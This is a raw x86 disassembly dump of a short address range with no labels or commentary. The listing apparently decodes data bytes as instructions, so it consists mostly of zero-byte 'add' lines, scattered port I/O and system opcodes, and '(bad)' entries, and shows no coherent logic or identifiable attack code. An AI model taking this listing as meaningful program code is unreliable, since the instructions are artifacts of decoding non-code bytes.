  4048e9:	adc    edx,DWORD PTR [esi+0x317800]
  4048ef:	add    BYTE PTR [eax],al
  4048f1:	add    BYTE PTR [esi+0x7105ef18],al
  4048f7:	or     DWORD PTR [eax+eax*1+0x3180],ebx
  4048fe:	add    BYTE PTR [eax],al
  404900:	xchg   BYTE PTR [eax],al
  404902:	adc    ah,BYTE PTR [edx]
  404904:	jno    0x40490f
  404906:	pushf  
  404907:	add    BYTE PTR [eax+0x33],bl
  40490d:	add    BYTE PTR [esi+0x7105ef18],al
  404913:	or     DWORD PTR [eax+eax*1+0x33a0],ebx
  40491a:	add    BYTE PTR [eax],al
  40491c:	xchg   BYTE PTR [eax],al
  40491e:	popf   
  40491f:	and    dh,BYTE PTR [ecx+0x9]
  404922:	pushf  
  404923:	add    BYTE PTR [eax],al
  404925:	add    BYTE PTR [ecx],al
  404927:	add    BYTE PTR [ebx+0x200000f],dh
  40492d:	add    BYTE PTR [eax+0x100000f],bh
  404933:	add    BYTE PTR [ebx+0x100000f],dh
  404939:	add    cl,al
  40493b:	sldt   WORD PTR [eax]
  40493e:	add    al,BYTE PTR [eax]
  404940:	(bad)  
  404941:	sldt   WORD PTR [eax]
  404944:	add    DWORD PTR [eax],eax
  404946:	ror    DWORD PTR [edi],0x0
  404949:	add    BYTE PTR [edx],al
  40494b:	add    dl,dl
  40494d:	sldt   WORD PTR [eax]
  404950:	add    DWORD PTR [eax],eax
  404952:	fimul  WORD PTR [edi]
  404954:	add    BYTE PTR [eax],al
  404956:	add    DWORD PTR [eax],eax
  404958:	(bad)  
  404959:	sldt   WORD PTR [eax]
  40495c:	add    al,BYTE PTR [eax]
  40495e:	in     al,0xf
  404960:	add    BYTE PTR [eax],al
  404962:	add    DWORD PTR [eax],eax
  404964:	fimul  WORD PTR [edi]
  404966:	add    BYTE PTR [eax],al
  404968:	add    DWORD PTR [eax],eax
  40496a:	in     eax,dx
  40496b:	sldt   WORD PTR [eax]
  40496e:	add    DWORD PTR [eax],eax
  404970:	in     eax,dx
  404971:	sldt   WORD PTR [eax]
  404974:	add    DWORD PTR [eax],eax
  404976:	in     eax,dx
  404977:	sldt   WORD PTR [eax]
  40497a:	add    DWORD PTR [eax],eax
  40497c:	fimul  WORD PTR [edi]
  40497e:	add    BYTE PTR [eax],al
  404980:	add    DWORD PTR [eax],eax
  404982:	hlt    
  404983:	sldt   WORD PTR [eax]
  404986:	add    DWORD PTR [eax],eax
  404988:	hlt    
  404989:	sldt   WORD PTR [eax]
  40498c:	add    al,BYTE PTR [eax]
  40498e:	mov    bl,0xf
  404990:	add    BYTE PTR [eax],al
  404992:	add    DWORD PTR [eax],eax
  404994:	mov    bl,0xf
  404996:	add    BYTE PTR [eax],al
  404998:	add    DWORD PTR [eax],eax
  40499a:	or     al,0x10
  40499c:	add    BYTE PTR [eax],al
  40499e:	add    DWORD PTR [eax],eax
  4049a0:	ror    DWORD PTR [edi],0x0
  4049a3:	add    BYTE PTR [edx],al
  4049a5:	add    dl,dl
  4049a7:	sldt   WORD PTR [eax]
  4049aa:	add    DWORD PTR [eax],eax
  4049ac:	sbb    BYTE PTR [eax],dl
  4049ae:	add    BYTE PTR [eax],al
  4049b0:	add    al,BYTE PTR [eax]
  4049b2:	sub    edx,DWORD PTR [eax]
  4049b4:	add    BYTE PTR [eax],al
  4049b6:	add    eax,DWORD PTR [eax]
  4049b8:	cmp    edx,DWORD PTR [eax]
  4049ba:	add    BYTE PTR [eax],al
  4049bc:	add    al,0x0
  4049be:	inc    ebp
  4049bf:	adc    BYTE PTR [eax],al
  4049c1:	add    BYTE PTR [ecx],al
  4049c3:	add    BYTE PTR [eax],bl
  4049c5:	adc    BYTE PTR [eax],al
  4049c7:	add    BYTE PTR [edx],al
  4049c9:	add    BYTE PTR [ebx],ch
  4049cb:	adc    BYTE PTR [eax],al
  4049cd:	add    BYTE PTR [ecx],al
  4049cf:	add    BYTE PTR [eax],bl
  4049d1:	adc    BYTE PTR [eax],al
  4049d3:	add    BYTE PTR [edx],al
  4049d5:	add    BYTE PTR [ebx],ch
  4049d7:	adc    BYTE PTR [eax],al
  4049d9:	add    BYTE PTR [ecx],al
  4049db:	add    BYTE PTR [edi+0x10],dl
  4049de:	add    BYTE PTR [eax],al
  4049e0:	add    al,BYTE PTR [eax]
  4049e2:	pop    edi
  4049e3:	adc    BYTE PTR [eax],al
  4049e5:	add    BYTE PTR [ebx],al
  4049e7:	add    BYTE PTR [edi+0x10],ah
  4049ea:	add    BYTE PTR [eax],al
  4049ec:	add    DWORD PTR [eax],eax
  4049ee:	ja     0x404a00
  4049f0:	add    BYTE PTR [eax],al
  4049f2:	add    al,BYTE PTR [eax]
  4049f4:	jge    0x404a06
  4049f6:	add    BYTE PTR [eax],al
  4049f8:	add    DWORD PTR [eax],eax
  4049fa:	mov    ss,WORD PTR [eax]
  4049fc:	add    BYTE PTR [eax],al
  4049fe:	add    DWORD PTR [eax],eax
  404a00:	xchg   edi,eax
  404a01:	adc    BYTE PTR [edx],al
  404a03:	add    BYTE PTR [ecx],al
  404a05:	add    BYTE PTR [edi+0x1000010],ah
  404a0b:	add    bl,ch
  404a0d:	adc    BYTE PTR [eax],al
  404a0f:	add    BYTE PTR [ecx],al
  404a11:	add    bh,dh
  404a13:	adc    BYTE PTR [eax],al
  404a15:	add    BYTE PTR [edx],al
  404a17:	add    dh,bh
  404a19:	adc    BYTE PTR [eax],al
  404a1b:	add    BYTE PTR [ebx],al
  404a1d:	add    BYTE PTR [ecx],cl
  404a1f:	adc    DWORD PTR [eax],eax
  404a21:	add    BYTE PTR [ecx],al
  404a23:	add    bh,dh
  404a25:	adc    BYTE PTR [eax],al
  404a27:	add    BYTE PTR [edx],al
  404a29:	add    dh,bh
  404a2b:	adc    BYTE PTR [eax],al
  404a2d:	add    BYTE PTR [ebx],al
  404a2f:	add    BYTE PTR [eax],bl
  404a31:	adc    DWORD PTR [edx],eax
  404a33:	add    BYTE PTR [eax+eax*1],al
  404a36:	and    DWORD PTR [ecx],edx
  404a38:	add    BYTE PTR [eax],al
  404a3a:	add    DWORD PTR [eax],eax
  404a3c:	sub    dl,BYTE PTR [ecx]
  404a3e:	add    BYTE PTR [eax],al
  404a40:	add    DWORD PTR [eax],eax
  404a42:	xor    edx,DWORD PTR [ecx]
  404a44:	add    al,BYTE PTR [eax]
  404a46:	add    al,BYTE PTR [eax]
  404a48:	adc    DWORD PTR ds:[eax],eax
  404a4b:	add    BYTE PTR [ecx],al
  404a4d:	add    BYTE PTR [ecx+0x11],cl
  404a50:	add    BYTE PTR [eax],al
  404a52:	add    DWORD PTR [eax],eax
  404a54:	or     DWORD PTR [ecx],edx
  404a56:	add    BYTE PTR [eax],al
  404a58:	add    al,BYTE PTR [eax]
  404a5a:	push   edi
  404a5b:	adc    DWORD PTR [eax],eax
  404a5d:	add    BYTE PTR [ebx],al
  404a5f:	add    BYTE PTR [esi+0x11],bl
  404a62:	add    BYTE PTR [eax],al
  404a64:	add    al,0x0
  404a66:	push   0x11
  404a68:	add    al,BYTE PTR [eax]
  404a6a:	add    eax,0x113e00
  404a6f:	add    BYTE PTR [ecx],al
  404a71:	add    BYTE PTR [ecx+edx*1+0x0],dh
  404a75:	add    BYTE PTR [edx],al
  404a77:	add    BYTE PTR [esi+0x11],bh
  404a7a:	add    BYTE PTR [eax],al
  404a7c:	add    eax,DWORD PTR [eax]
  404a7e:	xchg   BYTE PTR [ecx],dl
  404a80:	add    BYTE PTR [eax],al
  404a82:	add    DWORD PTR [eax],eax
  404a84:	xchg   ecx,eax
  404a85:	adc    DWORD PTR [edx],eax
  404a87:	add    BYTE PTR [edx],al
  404a89:	add    BYTE PTR [eax+0x1000011],ah
  404a8f:	add    al,al
  404a91:	adc    DWORD PTR [eax],eax
  404a93:	add    BYTE PTR [ecx],al
  404a95:	add    BYTE PTR [esi+0x1000010],cl
  404a9b:	add    ch,dl
  404a9d:	adc    DWORD PTR [edx],eax
  404a9f:	add    BYTE PTR [edx],al
  404aa1:	add    BYTE PTR [ecx],ah
  404aa3:	adc    DWORD PTR [eax],eax
  404aa5:	add    BYTE PTR [ecx],al
  404aa7:	add    dl,ah
  404aa9:	adc    DWORD PTR [eax],eax
  404aab:	add    BYTE PTR [ecx],al
  404aad:	add    cl,dh
  404aaf:	adc    DWORD PTR [eax],eax
  404ab1:	add    BYTE PTR [ecx],al
  404ab3:	add    BYTE PTR [esi+0x2000010],cl
  404ab9:	add    ch,bh
  404abb:	adc    DWORD PTR [edx],eax
  404abd:	add    BYTE PTR [ebx],al
  404abf:	add    BYTE PTR [edx+edx*1],cl
  404ac2:	add    al,BYTE PTR [eax]
  404ac4:	add    al,0x0
  404ac6:	adc    eax,0x1000012
  404acb:	add    BYTE PTR [esi+0x2000210],cl
  404ad1:	add    BYTE PTR [esi],bl
  404ad3:	adc    al,BYTE PTR [eax]
  404ad5:	add    BYTE PTR [ecx],al
  404ad7:	add    BYTE PTR [esi+0x2000010],cl
  404add:	add    BYTE PTR [esi],bl
  404adf:	adc    al,BYTE PTR [eax]
  404ae1:	add    BYTE PTR [ecx],al
  404ae3:	add    BYTE PTR [edx],ch
  404ae5:	adc    al,BYTE PTR [eax]
  404ae7:	add    BYTE PTR [edx],al
  404ae9:	add    BYTE PTR ds:0x3000012,dh
  404aef:	add    BYTE PTR [ebx+0x12],al
  404af2:	add    BYTE PTR [eax],al
  404af4:	add    al,0x0
  404af6:	and    DWORD PTR [ecx],edx
  404af8:	add    BYTE PTR [eax],al
  404afa:	add    eax,0x124c00
  404aff:	add    BYTE PTR [ecx],al
  404b01:	add    BYTE PTR [ebx+0x12],bl
  404b04:	add    BYTE PTR [eax],al
  404b06:	add    al,BYTE PTR [eax]
  404b08:	imul   edx,DWORD PTR [edx],0x0
  404b0b:	add    BYTE PTR [ecx],al
  404b0d:	add    BYTE PTR [edi+0x12],dh
  404b10:	add    BYTE PTR [eax],al
  404b12:	add    DWORD PTR [eax],eax
  404b14:	aad    0x11
  404b16:	add    al,BYTE PTR [eax]
  404b18:	add    al,BYTE PTR [eax]
  404b1a:	and    DWORD PTR [ecx],edx
  404b1c:	add    BYTE PTR [eax],al
  404b1e:	add    DWORD PTR [eax],eax
  404b20:	loop   0x404b33
  404b22:	add    BYTE PTR [eax],al
  404b24:	add    DWORD PTR [eax],eax
  404b26:	icebp  
  404b27:	adc    DWORD PTR [eax],eax
  404b29:	add    BYTE PTR [ecx],al
  404b2b:	add    BYTE PTR [ebx+0x2000012],al
  404b31:	add    BYTE PTR [esi+0x1000012],cl
  404b37:	add    BYTE PTR [ebx+0x1000012],al
  404b3d:	add    BYTE PTR [edi+0x12],dh
  404b40:	add    BYTE PTR [eax],al
  404b42:	add    al,BYTE PTR [eax]
  404b44:	std    
  404b45:	adc    DWORD PTR [edx],eax
  404b47:	add    BYTE PTR [ebx],al
  404b49:	add    BYTE PTR [edx+edx*1],cl
  404b4c:	add    al,BYTE PTR [eax]
  404b4e:	add    al,0x0
  404b50:	adc    eax,0x1000012
  404b55:	add    BYTE PTR [edi+0x12],dh
  404b58:	add    al,BYTE PTR [eax]
  404b5a:	add    al,BYTE PTR [eax]
  404b5c:	push   ds
  404b5d:	adc    al,BYTE PTR [eax]
  404b5f:	add    BYTE PTR [ecx],al
  404b61:	add    BYTE PTR [edi+0x12],dh
  404b64:	add    BYTE PTR [eax],al
  404b66:	add    al,BYTE PTR [eax]
  404b68:	push   ds
  404b69:	adc    al,BYTE PTR [eax]
  404b6b:	add    BYTE PTR [ecx],al
  404b6d:	add    BYTE PTR [edx+0x1000012],bl
  404b73:	add    dh,bl
  404b75:	sldt   WORD PTR [eax]
  404b78:	add    DWORD PTR [eax],eax
  404b7a:	fimul  WORD PTR [edi]
  404b7c:	add    BYTE PTR [eax],al
  404b7e:	add    DWORD PTR [eax],eax
  404b80:	hlt    
  404b81:	sldt   WORD PTR [eax]
  404b84:	add    DWORD PTR [eax],eax
  404b86:	fimul  WORD PTR [edi]
  404b88:	add    BYTE PTR [eax],al
  404b8a:	add    DWORD PTR [eax],eax
  404b8c:	fimul  WORD PTR [edi]
  404b8e:	add    BYTE PTR [eax],al
  404b90:	add    DWORD PTR [eax],eax
  404b92:	mov    ss,WORD PTR [eax]
  404b94:	add    BYTE PTR [eax],al
  404b96:	add    DWORD PTR [eax],eax
  404b98:	xchg   edi,eax
  404b99:	adc    BYTE PTR [edx],al
  404b9b:	add    BYTE PTR [ecx],al
  404b9d:	add    BYTE PTR [edi+0x1000010],ah
  404ba3:	add    bl,ch
  404ba5:	adc    BYTE PTR [eax],al
  404ba7:	add    BYTE PTR [ecx],al
  404ba9:	add    bh,dh
  404bab:	adc    BYTE PTR [eax],al
  404bad:	add    BYTE PTR [edx],al
  404baf:	add    dh,bh
  404bb1:	adc    BYTE PTR [eax],al
  404bb3:	add    BYTE PTR [ebx],al
  404bb5:	add    BYTE PTR [ecx],cl
  404bb7:	adc    DWORD PTR [eax],eax
  404bb9:	add    BYTE PTR [ecx],al
  404bbb:	add    bh,dh
  404bbd:	adc    BYTE PTR [eax],al
  404bbf:	add    BYTE PTR [edx],al
  404bc1:	add    dh,bh
  404bc3:	adc    BYTE PTR [eax],al
  404bc5:	add    BYTE PTR [ebx],al
  404bc7:	add    BYTE PTR [ecx],cl
  404bc9:	adc    DWORD PTR [eax],eax
  404bcb:	add    BYTE PTR [ecx],al
  404bcd:	add    bh,dh
  404bcf:	adc    BYTE PTR [eax],al
  404bd1:	add    BYTE PTR [edx],al
  404bd3:	add    dh,bh
  404bd5:	adc    BYTE PTR [eax],al
  404bd7:	add    BYTE PTR [ebx],al
  404bd9:	add    BYTE PTR [eax],bl
  404bdb:	adc    DWORD PTR [edx],eax
  404bdd:	add    BYTE PTR [eax+eax*1],al
  404be0:	and    DWORD PTR [ecx],edx
  404be2:	add    BYTE PTR [eax],al
  404be4:	add    DWORD PTR [eax],eax
  404be6:	sub    dl,BYTE PTR [ecx]
  404be8:	add    BYTE PTR [eax],al
  404bea:	add    DWORD PTR [eax],eax
  404bec:	xor    edx,DWORD PTR [ecx]
  404bee:	add    al,BYTE PTR [eax]
  404bf0:	add    al,BYTE PTR [eax]
  404bf2:	adc    DWORD PTR ds:[eax],eax
  404bf5:	add    BYTE PTR [ecx],al
  404bf7:	add    BYTE PTR [ecx+0x11],cl
  404bfa:	add    BYTE PTR [eax],al
  404bfc:	add    DWORD PTR [eax],eax
  404bfe:	or     DWORD PTR [ecx],edx
  404c00:	add    BYTE PTR [eax],al
  404c02:	add    al,BYTE PTR [eax]
  404c04:	push   edi
  404c05:	adc    DWORD PTR [eax],eax
  404c07:	add    BYTE PTR [ebx],al
  404c09:	add    BYTE PTR [esi+0x11],bl
  404c0c:	add    BYTE PTR [eax],al
  404c0e:	add    al,0x0
  404c10:	push   0x11
  404c12:	add    al,BYTE PTR [eax]
  404c14:	add    eax,0x113e00
  404c19:	add    BYTE PTR [ecx],al
  404c1b:	add    BYTE PTR [ecx+edx*1+0x0],dh
  404c1f:	add    BYTE PTR [edx],al
  404c21:	add    BYTE PTR [esi+0x11],bh
  404c24:	add    BYTE PTR [eax],al
  404c26:	add    eax,DWORD PTR [eax]
  404c28:	xchg   BYTE PTR [ecx],dl
  404c2a:	add    BYTE PTR [eax],al
  404c2c:	add    DWORD PTR [eax],eax
  404c2e:	xchg   ecx,eax
  404c2f:	adc    DWORD PTR [edx],eax
  404c31:	add    BYTE PTR [edx],al
  404c33:	add    BYTE PTR [eax+0x1000011],ah
  404c39:	add    al,al
  404c3b:	adc    DWORD PTR [eax],eax
  404c3d:	add    BYTE PTR [ecx],al
  404c3f:	add    BYTE PTR [ecx+0x1000012],ah
  404c45:	add    BYTE PTR [edx],dl
  404c47:	push   ds
  404c48:	add    BYTE PTR [eax],al
  404c4a:	add    al,BYTE PTR [eax]
  404c4c:	adc    eax,0x100001e
  404c51:	add    BYTE PTR [edx+edx*1+0x20000],ch
  404c58:	xor    eax,0x3000012
  404c5d:	add    BYTE PTR [ebx+0x12],al
  404c60:	add    BYTE PTR [eax],al
  404c62:	add    al,0x0
  404c64:	and    DWORD PTR [ecx],edx
  404c66:	add    BYTE PTR [eax],al
  404c68:	add    eax,0x12b100
  404c6d:	add    BYTE PTR [ecx],al
  404c6f:	add    dh,bl
  404c71:	sldt   WORD PTR [eax]
  404c74:	add    DWORD PTR [eax],eax
  404c76:	fimul  WORD PTR [edi]
  404c78:	add    BYTE PTR [eax],al
  404c7a:	add    DWORD PTR [eax],eax
  404c7c:	fimul  WORD PTR [edi]
  404c7e:	add    BYTE PTR [eax],al
  404c80:	add    DWORD PTR [eax],eax
  404c82:	fimul  WORD PTR [edi]
  404c84:	add    BYTE PTR [eax],al
  404c86:	add    DWORD PTR [eax],eax
  404c88:	fimul  WORD PTR [edi]
  404c8a:	add    BYTE PTR [eax],al
  404c8c:	add    DWORD PTR [eax],eax
  404c8e:	mov    eax,0x1000012
  404c93:	add    bh,cl
  404c95:	adc    dl,BYTE PTR [eax]
  404c97:	adc    BYTE PTR [edx],al
  404c99:	add    cl,bl
  404c9b:	adc    al,BYTE PTR [eax]
  404c9d:	add    BYTE PTR [ecx],al
  404c9f:	add    bh,cl
  404ca1:	adc    al,BYTE PTR [eax]
  404ca3:	add    BYTE PTR [ecx],al
  404ca5:	add    BYTE PTR [edx+edx*1+0x20000],ch
  404cac:	and    DWORD PTR [bx+si],eax
  404caf:	add    BYTE PTR [ebx],al
  404cb1:	add    BYTE PTR [ebx+0x12],al
  404cb4:	add    BYTE PTR [eax],al
  404cb6:	add    al,0x0
  404cb8:	and    DWORD PTR [ecx],edx
  404cba:	add    BYTE PTR [eax],al
  404cbc:	add    eax,0x217100
  404cc1:	add    BYTE PTR [esi],al
  404cc3:	add    bh,cl
  404cc5:	adc    cl,BYTE PTR [ecx]
  404cc7:	add    BYTE PTR ds:0x11000a00,cl
  404ccd:	add    BYTE PTR [esi],cl
  404ccf:	add    BYTE PTR ds:0x2c001100,dl
  404cd5:	add    BYTE PTR [edx],dl
  404cd7:	add    BYTE PTR [eax],dh
  404cd9:	add    BYTE PTR [edx],dl
  404cdb:	add    BYTE PTR [ecx],bl
  404cdd:	add    cl,bl
  404cdf:	add    bh,ch
  404ce1:	add    eax,0xe10971
  404ce6:	out    dx,eax
  404ce7:	add    eax,0xe90971
  404cec:	out    dx,eax
  404ced:	add    eax,0xf10997
  404cf2:	out    dx,eax
  404cf3:	add    eax,0xf90af1
  404cf8:	out    dx,eax
  404cf9:	add    eax,0x1010af1
  404cfe:	out    dx,eax
  404cff:	add    eax,0x1090af1
  404d04:	out    dx,eax
  404d05:	add    eax,0x1110af1
  404d0a:	out    dx,eax
  404d0b:	add    eax,0x1190af1
  404d10:	out    dx,eax
  404d11:	add    eax,0x1210af1
  404d16:	out    dx,eax
  404d17:	add    eax,0x1290af1
  404d1c:	out    dx,eax
  404d1d:	add    eax,0x1310997
  404d22:	out    dx,eax
  404d23:	add    eax,0x1390af1
  404d28:	out    dx,eax
  404d29:	add    eax,0x1410af1
  404d2e:	out    dx,eax
  404d2f:	add    eax,0x1490af1
  404d34:	out    dx,eax
  404d35:	add    eax,0x1590c28
  404d3a:	out    dx,eax
  404d3b:	add    eax,0x1610c2f
  404d40:	out    dx,eax
  404d41:	add    eax,0x1690971
  404d46:	fcom   DWORD PTR [esi+edx*8]
  404d49:	or     al,0x69
  404d4b:	add    ebp,ebp
  404d4d:	adc    al,0xdb
  404d4f:	or     al,0x9
  404d51:	add    bh,dh
  404d53:	adc    al,0x8c
  404d55:	or     DWORD PTR [ecx+0x1],esi
  404d58:	fcom   DWORD PTR [ecx+esi*8]
  404d5b:	or     bh,BYTE PTR [ecx+0x1]
  404d5e:	or     dl,BYTE PTR ds:0x9098c
  404d64:	out    dx,eax
  404d65:	add    eax,0x1890971
  404d6a:	and    eax,0x890cee15
  404d6f:	add    DWORD PTR [edi],ebp
  404d71:	adc    eax,0x1910982
  404d76:	aas    
  404d77:	adc    eax,0x1890cf3
  404d7c:	dec    eax
  404d7d:	adc    eax,0x1890cf8
  404d82:	push   edx
  404d83:	adc    eax,0x1790cfe
  404d88:	out    dx,eax
  404d89:	add    eax,0x390af1
  404d8e:	pop    ecx
  404d8f:	adc    eax,0x19109c9
  404d94:	outs   dx,BYTE PTR ds:[esi]
  404d95:	adc    eax,0x1890d05
  404d9a:	dec    eax
  404d9b:	adc    eax,0x1990d0c
  404da0:	jl     0x404db7
  404da2:	adc    DWORD PTR ds:0x5ef01a1,ecx
  404da8:	jno    0x404db3
  404daa:	inc    ecx
  404dab:	add    bl,bl
  404dad:	pop    es
  404dae:	and    eax,0x9500390d
  404db3:	adc    eax,0x18909c9
  404db8:	mov    eax,0xb10d2c15
  404dbd:	add    ebp,ebx
  404dbf:	adc    eax,0x1b10d3a
  404dc4:	not    BYTE PTR ds:0x1c10d43
  404dca:	or     dl,BYTE PTR [esi]
  404dcc:	dec    ecx
  404dcd:	or     eax,0x5ef0041
  404dd2:	dec    edi
  404dd3:	or     eax,0x167e01d1
  404dd8:	push   edi
  404dd9:	or     eax,0x5ef0049
  404dde:	xchg   edi,eax
  404ddf:	or     ecx,ebx
  404de1:	add    DWORD PTR [edi-0x26f68eea],esp
  404de7:	add    DWORD PTR [esi+edx*1+0x1e10971],ebp
  404dee:	aam    0x16
  404df0:	daa    
  404df1:	add    BYTE PTR [ecx+0x1],ch
  404df4:	fcom   DWORD PTR [edx+ebx*2]
  404df7:	or     eax,0x16e601e1
  404dfc:	daa    
  404dfd:	add    BYTE PTR [ecx+0x7805ef00],dh
  404e03:	or     eax,0x170301e9
  404e08:	jle    0x404e17
  404e0a:	jmp    0x82576310
  404e0f:	or     ecx,esi
  404e11:	add    DWORD PTR [esi],edi
  404e13:	pop    ss
  404e14:	test   BYTE PTR ds:0x5ef01f9,cl
  404e1a:	mov    DWORD PTR ds:0x5ef0051,ecx
  404e20:	xchg   ecx,eax
  404e21:	or     eax,0x5ef0209
  404e26:	jno    0x404e31
  404e28:	adc    DWORD PTR [edx],eax
  404e2a:	xchg   DWORD PTR [edi],edx
  404e2c:	call   0x1317:0x9201f10d
  404e33:	add    BYTE PTR [ecx+0x0],dl
  404e36:	mov    bh,0x17
  404e38:	mov    eax,ds:0xca00610d
  404e3d:	pop    ss
  404e3e:	lods   eax,DWORD PTR ds:[esi]
  404e3f:	or     eax,0x180d0059
  404e44:	mov    dl,0xd
  404e46:	or     al,0x0
  404e48:	sbb    ebx,DWORD PTR [eax]
  404e4a:	ret    
  404e4b:	or     eax,0x181f01f1
  404e50:	test   BYTE PTR ds:0x5ef0051,cl
  404e56:	fisttp DWORD PTR ds:0x183601f1
  404e5c:	adc    eax,DWORD PTR [eax]
  404e5e:	sub    DWORD PTR [edx],eax
  404e60:	out    dx,eax
  404e61:	add    eax,0x2310971
  404e66:	mov    DWORD PTR [eax],ebx
  404e68:	xchg   ebx,eax
  404e69:	or     DWORD PTR [ecx],esi
  404e6b:	add    ch,BYTE PTR [esi+edx*1+0x1890971]
  404e72:	xchg   ecx,eax
  404e73:	sbb    dh,dh
  404e75:	or     eax,0x18a90239
  404e7a:	sti    
  404e7b:	or     eax,0x18b60239
  404e80:	or     BYTE PTR [ecx],0x31
  404e83:	add    BYTE PTR [eax-0x76f68ef3],dh
  404e89:	add    DWORD PTR [esi+0x41001318],edi
  404e8f:	add    dl,ah
  404e91:	sbb    BYTE PTR [ebx-0xbff9ef7],dl
  404e97:	sbb    BYTE PTR [eax],cl
  404e99:	push   cs
  404e9a:	adc    al,0x0
  404e9c:	dec    eax
  404e9d:	sbb    DWORD PTR [edi],edx
  404e9f:	push   cs
  404ea0:	sbb    al,0x0
  404ea2:	push   esi
  404ea3:	sbb    DWORD PTR [edx],ebp
  404ea5:	push   cs
  404ea6:	imul   eax,DWORD PTR [edx],0xe2f1987
  404eac:	and    al,0x0
  404eae:	dec    eax
  404eaf:	sbb    DWORD PTR [edi],edx
  404eb1:	push   cs
  404eb2:	sub    al,0x0
  404eb4:	push   esi
  404eb5:	sbb    DWORD PTR [edx],ebp
  404eb7:	push   cs
  404eb8:	jno    0x404ebc
  404eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ebb:	sbb    DWORD PTR [esi+ecx*1+0x79],ecx
  404ebf:	add    bh,BYTE PTR [ecx+0x340e5219]
  404ec5:	add    BYTE PTR [ebx],bl
  404ec7:	sbb    bl,al
  404ec9:	or     eax,0x19ee0281
  404ece:	xchg   ebx,eax
  404ecf:	or     DWORD PTR [ecx+0x7d195602],ecx
  404ed5:	push   cs
  404ed6:	mov    DWORD PTR [edx],eax
  404ed8:	pop    ds
  404ed9:	sbb    al,BYTE PTR [ebx+0x5e02910e]
  404edf:	sbb    cl,BYTE PTR [ecx+0x2102990e]
  404ee5:	push   cs
  404ee6:	mov    WORD PTR [ecx],cs
  404ee8:	mov    eax,ds:0x8f1a8202
  404eed:	push   cs
  404eee:	mov    eax,ds:0x8c0e2102
  404ef3:	or     DWORD PTR [ecx-0x6ae572ff],ecx
  404ef9:	push   cs
  404efa:	test   eax,0x7105ef02
  404eff:	or     DWORD PTR [ecx+0x7105ef02],esi
  404f05:	or     DWORD PTR [eax+eax*1],edi
  404f08:	push   edi
  404f09:	sbb    ebp,DWORD PTR [edx]
  404f0b:	push   cs
  404f0c:	rol    DWORD PTR [edx],0xeb
  404f0f:	sbb    ecx,DWORD PTR [edx]
  404f11:	adc    cl,cl
  404f13:	add    ch,bh
  404f15:	add    eax,0x2d10af1
  404f1a:	sub    al,0x1d
  404f1c:	sub    eax,0xef02e110
  404f21:	add    eax,0x1b10971
  404f26:	addr16 sbb eax,0x2e9098c
  404f2c:	out    dx,eax
  404f2d:	add    eax,0x2f10971
  404f32:	xchg   esi,eax
  404f33:	sbb    eax,0x2f910dc
  404f38:	stos   BYTE PTR es:[edi],al
  404f39:	sbb    eax,0x2f110e8
  404f3e:	mov    edx,0xb110dc1d
  404f43:	add    cl,al
  404f45:	sbb    eax,0x3190971
  404f4a:	ja     0x404f6a
  404f4c:	adc    ah,BYTE PTR gs:[ecx]
  404f4f:	add    esi,DWORD PTR [esi+0x21126c1e]
  404f55:	add    eax,DWORD PTR [edi+0x19127117]
  404f5b:	add    ebx,ecx
  404f5d:	push   ds
  404f5e:	pop    edx
  404f5f:	or     eax,0x1ede0289
  404f64:	js     0x404f78
  404f66:	cmp    DWORD PTR [ebx],eax
  404f68:	or     bl,BYTE PTR [edi]
  404f6a:	adc    DWORD PTR [edx],0x31
  404f6d:	add    edx,DWORD PTR [ebx]
  404f6f:	pop    ds
  404f70:	mov    BYTE PTR [edx],dl
  404f72:	mov    ecx,0x8f05ef00
  404f77:	adc    cl,BYTE PTR [ecx]
  404f79:	add    ebp,DWORD PTR [eax]
  404f7b:	pop    ds
  404f7c:	jno    0x404f87
  404f7e:	adc    DWORD PTR [ebx],eax
  404f80:	out    dx,eax
  404f81:	add    eax,0x3090d78
  404f86:	dec    eax
  404f87:	pop    ds
  404f88:	xchg   ebp,eax
  404f89:	adc    al,BYTE PTR [ecx+0x3]
  404f8c:	out    dx,eax
  404f8d:	add    eax,0x3090971
  404f92:	lahf   
  404f93:	pop    ds
  404f94:	pushf  
  404f95:	adc    cl,BYTE PTR [ecx]
  404f97:	add    esi,DWORD PTR [eax-0x46f68ef3]
  404f9d:	add    BYTE PTR [ecx+0x5109711f],dh
  404fa3:	add    ebx,eax
  404fa5:	pop    ds
  404fa6:	scas   eax,DWORD PTR es:[edi]
  404fa7:	adc    cl,BYTE PTR [ecx]
  404fa9:	add    esi,ebp
  404fab:	pop    ds
  404fac:	mov    ch,0x12
  404fae:	or     DWORD PTR [ebx],eax
  404fb0:	sbb    BYTE PTR [eax],ah
  404fb2:	mov    ebx,0x2a02c112
  404fb7:	and    cl,al
  404fb9:	adc    cl,BYTE PTR [ecx]
  404fbb:	add    ebp,DWORD PTR [ebx]
  404fbd:	or     cl,ch
  404fbf:	adc    al,BYTE PTR [eax+eax*1-0x11]
  404fc3:	add    eax,0x4c0971
  404fc8:	push   esi
  404fc9:	sbb    DWORD PTR [edx],ebp
  404fcb:	push   cs
  404fcc:	inc    esp
  404fcd:	add    BYTE PTR [ebx],bl
  404fcf:	sbb    bl,al
  404fd1:	or     eax,0xa3a0309
  404fd6:	repz adc cl,BYTE PTR [ecx]
  404fd9:	add    edx,DWORD PTR [edx+0xa]
  404fdc:	or     DWORD PTR [ebx],edx
  404fde:	or     DWORD PTR [ebx],eax
  404fe0:	pusha  
  404fe1:	or     dh,BYTE PTR [ecx+0x9]
  404fe4:	or     DWORD PTR [ebx],eax
  404fe6:	outs   dx,DWORD PTR ds:[esi]
  404fe7:	or     cl,BYTE PTR [edi]
  404fe9:	adc    ecx,DWORD PTR [ecx]
  404feb:	add    eax,DWORD PTR [ebx+0x9131c0a]
  404ff1:	add    ebx,DWORD PTR [esi-0x36ecd0f6]
  404ff7:	add    bh,ch
  404ff9:	add    eax,0x3b10971
  404ffe:	out    dx,eax
  404fff:	add    eax,0x3090d78
  405004:	mov    ebp,0x9135f0a
  405009:	add    eax,esp
  40500b:	or     dl,BYTE PTR [eax]
  40500d:	or     ecx,DWORD PTR [ecx]
  40500f:	add    edx,ecx
  405011:	or     dh,cl
  405013:	or     cl,BYTE PTR [ecx]
  405015:	add    ebx,edi
  405017:	or     bl,BYTE PTR [edx]
  405019:	or     ecx,DWORD PTR [ecx]
  40501b:	add    edi,ecx
  40501d:	or     ah,BYTE PTR [ecx]
  40501f:	or     edx,DWORD PTR [ecx]
  405021:	add    ah,dh
  405023:	and    DWORD PTR [edx+0x13],edi
  405026:	or     DWORD PTR [ebx],eax
  405028:	push   ss
  405029:	or     eax,DWORD PTR [edx+0x22030913]
